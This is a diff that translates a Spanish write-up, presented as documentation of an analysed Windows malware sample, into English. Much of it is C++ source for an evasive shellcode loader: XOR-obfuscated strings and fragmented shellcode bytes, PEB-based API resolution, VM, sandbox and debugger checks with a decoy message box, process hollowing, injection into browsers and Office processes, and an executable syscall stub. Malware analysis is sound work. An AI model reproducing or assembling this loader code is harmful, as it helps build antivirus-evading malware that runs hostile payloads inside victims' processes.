@@ -1,28 +1,28 @@
 
 
-# Documentación Técnica del Malware
+# Technical Documentation of the Malware
 
-## Arquitectura General
+## General Architecture
 
-El malware analizado está diseñado con una arquitectura modular que permite una alta evasión de sistemas de detección y análisis. Su estructura se compone de varios componentes clave:
+The analyzed malware is designed with a modular architecture that allows high evasion of detection and analysis systems. Its structure consists of several key components:
 
-### 1. Estructura de Carga Dinámica de APIs
+### 1. Dynamic API Loading Structure
 ```cpp
 struct APIAddresses {
     // kernel32.dll
     HMODULE(WINAPI *LoadLibraryA)(LPCSTR);
     FARPROC(WINAPI *GetProcAddress)(HMODULE, LPCSTR);
-    // ... más APIs
+    // ... more APIs
 };
 ```
 
-Esta estructura almacena punteros a funciones críticas del sistema que se resuelven dinámicamente durante la ejecución, evitando así la detección estática de importaciones.
+This structure stores pointers to critical system functions that are resolved dynamically during execution, thus avoiding static detection of imports.
 
-### 2. Sistema de Ofuscación
-El malware implementa un sistema de ofuscación basado en XOR para:
-- Cadenas de texto
+### 2. Obfuscation System
+The malware implements an XOR-based obfuscation system for:
+- Text strings
 - Shellcode
-- Nombres de funciones y procesos
+- Function and process names
 
 ```cpp
 constexpr std::array<unsigned char, 16> encryptionKeyTC = {
@@ -32,114 +32,114 @@ constexpr std::array<unsigned char, 16> encryptionKeyTC = {
 
 template <size_t N>
 class EncryptedString {
-    // Implementación de cadenas encriptadas en tiempo de compilación
+    // Implementation of compile-time encrypted strings
 };
 ```
 
-### 3. Módulo Anti-Análisis
-Implementa múltiples técnicas para detectar y evadir entornos de análisis:
-- Detección de máquinas virtuales
-- Detección de sandboxes
-- Detección de depuradores
-- Detección de hooks de API
+### 3. Anti-Analysis Module
+Implements multiple techniques to detect and evade analysis environments:
+- Virtual machine detection
+- Sandbox detection
+- Debugger detection
+- API hook detection
 
-## Workflow de Ejecución
+## Execution Workflow
 
-El flujo de ejecución del malware sigue una secuencia cuidadosamente diseñada para maximizar su efectividad y evasión:
+The malware's execution flow follows a carefully designed sequence to maximize its effectiveness and evasion:
 
-### 1. Inicialización
+### 1. Initialization
 ```cpp
 int main() {
-    // Inicializar las APIs
+    // Initialize the APIs
     if (!InitializeAPIs()) {
-        std::cout << "Error al inicializar las APIs" << std::endl;
+        std::cout << "Error initializing APIs" << std::endl;
         return 0;
     }
     // ...
 }
 ```
 
-El malware comienza cargando dinámicamente todas las APIs necesarias mediante la función `InitializeAPIs()`, que utiliza técnicas de resolución de símbolos sin llamar directamente a `GetProcAddress`.
+The malware begins by dynamically loading all necessary APIs through the `InitializeAPIs()` function, which uses symbol resolution techniques without directly calling `GetProcAddress`.
 
-### 2. Detección de Entorno Hostil
+### 2. Hostile Environment Detection
 ```cpp
 if (IsRunningInVM() || IsRunningInSandbox() || APIs.IsDebuggerPresent() || 
     CheckRemoteDebuggerPresent() || DetectAPIHooks()) {
-    // Si estamos en un entorno de análisis, ejecutar codigo benigno
-    APIs.MessageBoxA(NULL, "Hola Mundo", "Mensaje", MB_OK);
+    // If we're in an analysis environment, execute benign code
+    APIs.MessageBoxA(NULL, "Hello World", "Message", MB_OK);
     return 0;
 }
 ```
 
-Realiza una serie de comprobaciones para determinar si se está ejecutando en un entorno de análisis. Si detecta alguna anomalía, ejecuta código benigno para evitar la detección.
+It performs a series of checks to determine if it's running in an analysis environment. If it detects any anomalies, it executes benign code to avoid detection.
 
-### 3. Retraso Anti-Sandbox
+### 3. Anti-Sandbox Delay
 ```cpp
 AntiSandboxDelay();
 ```
 
-Implementa un retraso variable en la ejecución para evadir análisis automatizados de sandboxes, que suelen tener límites de tiempo.
+Implements a variable delay in execution to evade automated sandbox analysis, which usually has time limits.
 
-### 4. Preparación del Payload
+### 4. Payload Preparation
 ```cpp
-// Combinar partes del shellcode
+// Combine shellcode parts
 unsigned char* combinedShellcode = new unsigned char[shellcodeSize];
 CombineShellcode(combinedShellcode);
 
-// Encriptar el shellcode combinado
+// Encrypt the combined shellcode
 XorCrypt(combinedShellcode, shellcodeSize, encryptionKey, sizeof(encryptionKey));
 ```
 
-Combina las múltiples partes del shellcode y lo encripta para evitar su detección.
+Combines the multiple parts of the shellcode and encrypts it to avoid detection.
 
-### 5. Inyección del Payload
-El malware implementa múltiples técnicas de inyección, intentándolas en orden:
+### 5. Payload Injection
+The malware implements multiple injection techniques, trying them in order:
 
 #### 5.1 Process Hollowing
 ```cpp
 if (ProcessHollowing(combinedShellcode, shellcodeSize)){
-    std::cout << "PH completado" << std::endl;
+    std::cout << "PH completed" << std::endl;
     return 0;
 }
 ```
 
-La técnica más sofisticada que utiliza es el Process Hollowing, que consiste en:
-1. Crear un proceso legítimo en estado suspendido
-2. Vaciar su espacio de memoria
-3. Reemplazarlo con el payload malicioso
-4. Modificar el punto de entrada
-5. Reanudar la ejecución
+The most sophisticated technique it uses is Process Hollowing, which consists of:
+1. Creating a legitimate process in a suspended state
+2. Emptying its memory space
+3. Replacing it with the malicious payload
+4. Modifying the entry point
+5. Resuming execution
 
-#### 5.2 Inyección en Proceso Remoto
+#### 5.2 Remote Process Injection
 ```cpp
 if (InjectIntoProcess(combinedShellcode, shellcodeSize)) {
-    std::cout << "Inyeccion completada" << std::endl;
+    std::cout << "Injection completed" << std::endl;
     delete[] combinedShellcode;
     return 0;
 }
 ```
 
-Si el Process Hollowing falla, intenta inyectar el código en procesos legítimos en ejecución como notepad.exe, mspaint.exe, etc.
+If Process Hollowing fails, it attempts to inject the code into running legitimate processes such as notepad.exe, mspaint.exe, etc.
 
-#### 5.3 Ejecución Local
+#### 5.3 Local Execution
 ```cpp
-// Si falla la inyeccion, usar técnica de memoria local
+// If injection fails, use local memory technique
 SIZE_T size = shellcodeSize;
 LPVOID memory = NULL;
 
-// Asignar memoria usando syscall indirecta
+// Allocate memory using indirect syscall
 NTSTATUS status = APIs.NtAllocateVirtualMemory(GetCurrentProcess(), &memory, 0, &size, 
                                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 ```
 
-Como último recurso, ejecuta el payload en el espacio de memoria del propio proceso.
+As a last resort, it executes the payload in its own process's memory space.
 
-## Técnicas Utilizadas
+## Techniques Used
 
-### 1. Ofuscación y Evasión
+### 1. Obfuscation and Evasion
 
-#### 1.1 Encriptación de Cadenas
-Utiliza un sistema de encriptación XOR para cadenas de texto, evitando que los análisis estáticos detecten strings sospechosos.
+#### 1.1 String Encryption
+Uses an XOR encryption system for text strings, preventing static analysis from detecting suspicious strings.
 
 ```cpp
 #define ENC_STR(str) []() { \
@@ -149,21 +149,21 @@ Utiliza un sistema de encriptación XOR para cadenas de texto, evitando que los 
 }()
 ```
 
-#### 1.2 Shellcode Fragmentado
-El shellcode está dividido en 22 partes diferentes para evadir firmas antivirus:
+#### 1.2 Fragmented Shellcode
+The shellcode is divided into 22 different parts to evade antivirus signatures:
 
 ```cpp
 unsigned char part1[] = { 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41 };
 unsigned char part2[] = { 0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x56,0x65,0x48,0x8b,0x52,0x60 };
-// ... más partes
+// ... more parts
 ```
 
-#### 1.3 Carga Dinámica de APIs
-Evita usar importaciones estáticas, resolviendo las funciones en tiempo de ejecución:
+#### 1.3 Dynamic API Loading
+Avoids using static imports, resolving functions at runtime:
 
 ```cpp
 HMODULE GetModuleBaseAddress(const char* moduleName) {
-    // Obtiene el PEB del proceso actual
+    // Get the current process's PEB
 #ifdef _WIN64
     PPEB peb = (PPEB)__readgsqword(0x60);
 #else
@@ -173,22 +173,22 @@ HMODULE GetModuleBaseAddress(const char* moduleName) {
 }
 ```
 
-### 2. Técnicas Anti-Análisis
+### 2. Anti-Analysis Techniques
 
-#### 2.1 Detección de Máquinas Virtuales
+#### 2.1 Virtual Machine Detection
 ```cpp
 bool IsRunningInVM() {
-    // Verificar número de procesadores
+    // Check number of processors
     if (si.dwNumberOfProcessors < 2) {
         return true;
     }
     
-    // Verificar cantidad de RAM
+    // Check amount of RAM
     if (memStatus.ullTotalPhys < 2147483648ULL) { // 2GB
         return true;
     }
     
-    // Verificar dispositivos virtuales comunes
+    // Check common virtual devices
     if (strstr(buffer, ENC_STR("VBOX")) || 
         strstr(buffer, ENC_STR("VMWARE")) || 
         strstr(buffer, ENC_STR("VIRTUAL")) || 
@@ -196,23 +196,23 @@ bool IsRunningInVM() {
 }
 ```
 
-#### 2.2 Detección de Sandboxes
+#### 2.2 Sandbox Detection
 ```cpp
 bool IsRunningInSandbox() {
-    // Verificar tiempo de actividad del sistema
+    // Check system uptime
     DWORD uptime = GetTickCount();
-    if (uptime < 600000) { // Menos de 10 minutos
+    if (uptime < 600000) { // Less than 10 minutes
         return true;
     }
     
-    // Verificar procesos relacionados con análisis
+    // Check analysis-related processes
     if (_stricmp(pe32.szExeFile, ENC_STR("procexp.exe")) == 0 ||
         _stricmp(pe32.szExeFile, ENC_STR("wireshark.exe")) == 0 ||
         // ...
 }
 ```
 
-#### 2.3 Detección de Depuradores
+#### 2.3 Debugger Detection
 ```cpp
 bool IsDebuggerPresentCustom() {
     return ::IsDebuggerPresent() != FALSE;
@@ -226,44 +226,44 @@ bool CheckRemoteDebuggerPresent() {
 }
 ```
 
-### 3. Técnicas de Inyección
+### 3. Injection Techniques
 
 #### 3.1 Process Hollowing
-Esta es la técnica más sofisticada implementada por el malware:
+This is the most sophisticated technique implemented by the malware:
 
 ```cpp
 bool ProcessHollowing(unsigned char* shellcode, DWORD shellcodeSize) {
-    // 1. Crear el proceso en estado suspendido
+    // 1. Create the process in a suspended state
     if (!CreateProcessA(systemPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, 
                         NULL, NULL, &si, &pi)) {
         return false;
     }
     
-    // 2. Obtener la dirección base de la imagen del proceso
+    // 2. Get the process's image base address
     PVOID imageBaseAddress;
     if (!GetProcessImageBase(pi.hProcess, &imageBaseAddress)) {
         return false;
     }
     
-    // 3. Leer la cabecera PE del proceso
+    // 3. Read the process's PE header
     // ...
     
-    // 4. Liberar la memoria del proceso original
+    // 4. Free the original process's memory
     if (!VirtualFreeEx(pi.hProcess, imageBaseAddress, 0, MEM_RELEASE)) {
         return false;
     }
     
-    // 5. Asignar nueva memoria para el shellcode
+    // 5. Allocate new memory for the shellcode
     pNewImageBase = VirtualAllocEx(pi.hProcess, imageBaseAddress, shellcodeSize, 
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
-    // 6. Escribir el shellcode en la memoria del proceso
+    // 6. Write the shellcode to the process's memory
     if (!WriteProcessMemory(pi.hProcess, pNewImageBase, decryptedShellcode, 
                            shellcodeSize, NULL)) {
         return false;
     }
     
-    // 7. Modificar el contexto del hilo para apuntar al nuevo código
+    // 7. Modify the thread context to point to the new code
     CONTEXT context;
     context.ContextFlags = CONTEXT_FULL;
     GetThreadContext(pi.hThread, &context);
@@ -274,37 +274,37 @@ bool ProcessHollowing(unsigned char* shellcode, DWORD shellcodeSize) {
     context.Eax = (DWORD)pNewImageBase;
 #endif
     
-    // 8. Actualizar el contexto del hilo
+    // 8. Update the thread context
     SetThreadContext(pi.hThread, &context);
     
-    // 9. Reanudar la ejecución del proceso
+    // 9. Resume process execution
     ResumeThread(pi.hThread);
     
     return true;
 }
 ```
 
-#### 3.2 Inyección en Proceso Remoto
+#### 3.2 Remote Process Injection
 ```cpp
 bool InjectIntoProcess(unsigned char* shellcode, DWORD size) {
-    // 1. Buscar procesos objetivo
+    // 1. Search for target processes
     const char* targetProcesses[] = {
         "notepad.exe", "mspaint.exe", "write.exe", "winword.exe", "excel.exe",
         "chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe", 
     };
     
-    // 2. Abrir el proceso con permisos adecuados
+    // 2. Open the process with appropriate permissions
     process = APIs.OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | 
                               PROCESS_CREATE_THREAD, FALSE, processEntry.th32ProcessID);
     
-    // 3. Asignar memoria en el proceso remoto
+    // 3. Allocate memory in the remote process
     LPVOID remoteMem = APIs.VirtualAllocEx(process, NULL, size, MEM_COMMIT | MEM_RESERVE, 
                                           PAGE_EXECUTE_READWRITE);
     
-    // 4. Escribir shellcode en el proceso remoto
+    // 4. Write shellcode to the remote process
     APIs.WriteProcessMemory(process, remoteMem, decryptedShellcode, size, NULL);
     
-    // 5. Crear hilo remoto para ejecutar el shellcode
+    // 5. Create remote thread to execute the shellcode
     HANDLE thread = APIs.CreateRemoteThread(process, NULL, 0, 
                                            (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
     
@@ -312,13 +312,13 @@ bool InjectIntoProcess(unsigned char* shellcode, DWORD size) {
 }
 ```
 
-### 4. Técnicas de Ejecución
+### 4. Execution Techniques
 
-#### 4.1 Syscall Indirectas
+#### 4.1 Indirect Syscalls
 ```cpp
 NTSTATUS DynamicSyscall(DWORD syscallNumber, HANDLE ProcessHandle, PVOID* BaseAddress, 
                        ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
-    // Construir syscall stub dinámico
+    // Build dynamic syscall stub
     BYTE syscallStub[] = {
         0x4C, 0x8B, 0xD1,               // mov r10, rcx
         0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, syscallNumber
@@ -326,10 +326,10 @@ NTSTATUS DynamicSyscall(DWORD syscallNumber, HANDLE ProcessHandle, PVOID* BaseAd
         0xC3                            // ret
     };
     
-    // Insertar número de syscall
+    // Insert syscall number
     *(DWORD*)(syscallStub + 5) = syscallNumber;
     
-    // Ejecutar stub
+    // Execute stub
     void* execMem = VirtualAlloc(NULL, sizeof(syscallStub), MEM_COMMIT | MEM_RESERVE, 
                                 PAGE_EXECUTE_READWRITE);
     memcpy(execMem, syscallStub, sizeof(syscallStub));
@@ -344,8 +344,8 @@ NTSTATUS DynamicSyscall(DWORD syscallNumber, HANDLE ProcessHandle, PVOID* BaseAd
 }
 ```
 
-## Conclusiones
+## Conclusions
 
-El malware analizado representa una amenaza sofisticada que implementa múltiples técnicas de evasión y persistencia. Su arquitectura modular y su capacidad para adaptarse a diferentes entornos lo hacen particularmente difícil de detectar y analizar. Las técnicas de Process Hollowing y la carga dinámica de APIs son especialmente notables por su eficacia para evadir sistemas de detección.
+The analyzed malware represents a sophisticated threat that implements multiple evasion and persistence techniques. Its modular architecture and its ability to adapt to different environments make it particularly difficult to detect and analyze. The Process Hollowing techniques and dynamic API loading are especially notable for their effectiveness in evading detection systems.
 
-La implementación de múltiples capas de ofuscación, junto con las técnicas anti-análisis, demuestran un alto nivel de conocimiento por parte de sus desarrolladores sobre el funcionamiento interno de Windows y las metodologías de análisis de malware.
+The implementation of multiple layers of obfuscation, along with anti-analysis techniques, demonstrate a high level of knowledge on the part of its developers about the internal workings of Windows and malware analysis methodologies.
